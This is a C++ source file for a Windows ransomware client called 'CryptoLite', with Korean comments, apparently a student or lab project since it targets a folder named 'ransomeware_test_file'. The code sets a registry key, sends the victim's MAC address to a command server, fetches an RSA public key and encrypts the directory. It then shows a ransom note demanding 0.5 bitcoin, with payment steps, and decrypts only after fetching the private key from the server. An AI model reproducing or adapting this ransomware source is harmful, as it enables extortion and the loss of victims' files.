#define _CRT_SECURE_NO_WARNINGS

#include <WinSock2.h>
#include <windows.h>
#include <iostream>
#include <vector>
#include <openssl/applink.c>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include "framework.h"
#include "client.h"
#include "rsa.hpp"
#include "fileEnc.hpp"
#include "internet.hpp"
#include "registry.hpp"

using namespace std;

LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

#pragma comment(linker, "/entry:wWinMainCRTStartup /subsystem:console")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")
HWND hEdit;

#define IDC_MAIN_BUTTON	101			// Button identifier
#define IDC_MAIN_EDIT	102			// Edit box identifier

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
{

    // 레지스트리 키 등록
    SaveReg();

    // start 인경우 -> 공개키 저장
    string filename = "C:\\Users";
    string userName = getUserName();
    filename += "\\" + userName + "\\ransomeware_test_file";

    WIN32_FIND_DATAA data;
    HANDLE hFind = FindFirstFileA((filename + "\\dirkey.key").c_str(), &data);
    if (hFind == INVALID_HANDLE_VALUE) {
        // 암호화 되어 있지 않은 경우
        cout << "start";

        // 소켓 생성
        SOCKET clientSocket = StartSocket();

        // MAC 주소 전송
        string wifiMacAddress = getMacAddress();
        send(clientSocket, wifiMacAddress.c_str(), wifiMacAddress.size(), 0);
        send(clientSocket, "start", sizeof("start"), 0);

        // 서버로부터 공개키 수신
        GetPubKeyFromServer(clientSocket);

        WSACleanup();
        closesocket(clientSocket);
    
        RSA* pubKey = getPubKey();
        EncryptDir(pubKey, filename);
        RSA_free(pubKey);
    }
    FindClose(hFind);

    

    // win32 gui class
    //
    //
    //
    //Modified version of: http://www.win32developer.com/tutorial/windows/windows_tutorial_3.shtm

    //Creates the Win32 gui class
    WNDCLASSEX wClass;
    ZeroMemory(&wClass, sizeof(WNDCLASSEX));
    wClass.cbClsExtra = NULL;
    wClass.cbSize = sizeof(WNDCLASSEX);
    wClass.cbWndExtra = NULL;
    wClass.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wClass.hCursor = LoadCursor(NULL, IDC_ARROW);
    wClass.hIcon = NULL;
    wClass.hIconSm = NULL;
    wClass.hInstance = hInstance;
    wClass.lpfnWndProc = (WNDPROC)WinProc;
    wClass.lpszClassName = L"Window Class";
    wClass.lpszMenuName = NULL;
    wClass.style = CS_HREDRAW | CS_VREDRAW;

    //Registers the class
    if (!RegisterClassEx(&wClass))
    {
        int nResult = GetLastError();
        MessageBox(NULL,
            L"Window class creation failed\r\n",
            L"Window Class Failed",
            MB_ICONERROR);
    }

    //Creates the window handle
    HWND hWnd = CreateWindowEx(NULL, L"Window Class", L"CryptoLite",
        WS_POPUP | WS_VISIBLE | WS_SYSMENU | WS_EX_TOOLWINDOW, 200, 200, 560, 340,
        NULL, NULL, hInstance, NULL);

    if (!hWnd)
    {
        int nResult = GetLastError();

        MessageBox(NULL,
            L"Window creation failed\r\n",
            L"Window Creation Failed",
            MB_ICONERROR);
    }

    //Displays the window handle
    ShowWindow(hWnd, nCmdShow);

    MSG msg;
    ZeroMemory(&msg, sizeof(MSG));

    //Waits for a response from the window, such as a button click
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}


/*
Callback created to add text and objects to the screen
Waits for user input and executes code depending on the action
*/
LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg)
    {
        //Creates the text on screen by painting
    case WM_PAINT:
    {
        //Vector of text to be displayed
        std::vector<LPCWSTR> ransomText;
        ransomText.push_back(L"ALL YOUR FILES HAVE BEEN ENCRYPTED!!!");
        ransomText.push_back(L"There's no way to decrypt these files without the decryption key.");
        ransomText.push_back(L"To retrieve the deceryption key a payment of 0.5 BC will need to be paid.");
        ransomText.push_back(L"");
        ransomText.push_back(L"INSTRUCTIONS:");
        ransomText.push_back(L"");
        ransomText.push_back(L"*Purchase the bitcoins from https://localbitcoins.com/.");
        ransomText.push_back(L"*Transfer the bitcoins to a https://blockchain.info/ Wallet.");
        ransomText.push_back(L"*From https://blockchain.info/ transfer the bitcoins to the below address.");
        ransomText.push_back(L"*Add a message to the transaction with the following format:");
        ransomText.push_back(L"{MAC-ADDRESS_EMAIL} <- ENSURE THIS IS CORRECT");
        ransomText.push_back(L"Example:");
        ransomText.push_back(L"00:A0:C9:14:C8:29_pwned@gmail.com");
        ransomText.push_back(L"");
        ransomText.push_back(L"Following payment the key will be emailed to you after confimation.");
        ransomText.push_back(L"");
        ransomText.push_back(L"IF YOU MESS UP YOUR MESSAGE FROMAT, YOU WILL NOT RECEIVE THE KEY!");

        PAINTSTRUCT ps;
        HDC hDC = BeginPaint(hWnd, &ps);
        //Setting the text style
        SetBkMode(hDC, TRANSPARENT);
        SetTextColor(hDC, RGB(0, 255, 0));

        //For every line of text in the it adds spacing
        for (size_t i = 0; i < ransomText.size(); i++)
        {
            //Writes the text
            TextOut(hDC, 10, 10 + (15 * i + 1), ransomText.at(i), wcslen(ransomText.at(i)));
        }
        //Text near the bitcoin edit box
        LPCWSTR bcLabel = (L"BitCoin Address:");
        TextOut(hDC, 10, 280, bcLabel, wcslen(bcLabel));
        //Text near the decryption key edit box
        LPCWSTR keyLabel = (L"Decryption Key:");
        TextOut(hDC, 10, 310, keyLabel, wcslen(keyLabel));

        EndPaint(hWnd, &ps);
    }
    break;


    //Creates the objects in the GUI
    case WM_CREATE:
    {
        // Creates a readonly edit box with my bitcoin addresss
        hEdit = CreateWindowEx(WS_EX_CLIENTEDGE, L"EDIT", L"When you input 'end', files will be decrypted.",
            WS_CHILD | WS_VISIBLE | ES_READONLY, 140, 280, 300, 20, hWnd, NULL, NULL, NULL);

        // Create an edit box
        hEdit = CreateWindowEx(WS_EX_CLIENTEDGE, L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 140, 310, 300, 20, hWnd, NULL, NULL, NULL);

        // Create a push button
        HWND hWndButton = CreateWindowEx(NULL, L"BUTTON", L"DECRYPT",
            WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 450, 310, 100, 22,
            hWnd, (HMENU)IDC_MAIN_BUTTON, GetModuleHandle(NULL), NULL);

    }
    break;
    //Waits for the commands to be sent back (Such as button presses)
    case WM_COMMAND:
        switch (LOWORD(wParam))
        {
            //Definded in header
        case IDC_MAIN_BUTTON:
        { 
            
            //Waits for get message, reads the text and inputs into wchar buffer
            wchar_t* buffer[256];
			SendMessage(hEdit, WM_GETTEXT, sizeof(buffer) / sizeof(buffer[0]), reinterpret_cast<LONG_PTR>(buffer));
            std::wstring wkey = std::wstring((wchar_t*)buffer);
            std::string key(wkey.begin(), wkey.end());

            if (key == "end") {
                
                // 소켓 생성
                SOCKET clientSocket = StartSocket();

                // 서버로 MAC 주소 전송
                string wifiMacAddress = getMacAddress();
                send(clientSocket, wifiMacAddress.c_str(), wifiMacAddress.size(), 0);
                send(clientSocket, "end", sizeof("end"), 0);

                // 서버로부터 공개키 수신
                GetPriKeyFromServer(clientSocket);

                WSACleanup();
                closesocket(clientSocket);

                string filename = "C:\\Users";
                string userName = getUserName();
                filename += "\\" + userName + "\\ransomeware_test_file";

                RSA* priKey = getPriKey();
                DecryptDir(priKey, filename);
                RSA_free(priKey);
                DeleteReg();

                return DefWindowProc(hWnd, msg, wParam, lParam);
            }
        }
        break;
        }
        break;
        //User closed the ransomware
    case WM_DESTROY:
    {
        //exits the ransomware
        PostQuitMessage(0);
        return 0;
    }
    break;
    }
    //destroys the windows process
    return DefWindowProc(hWnd, msg, wParam, lParam);
}



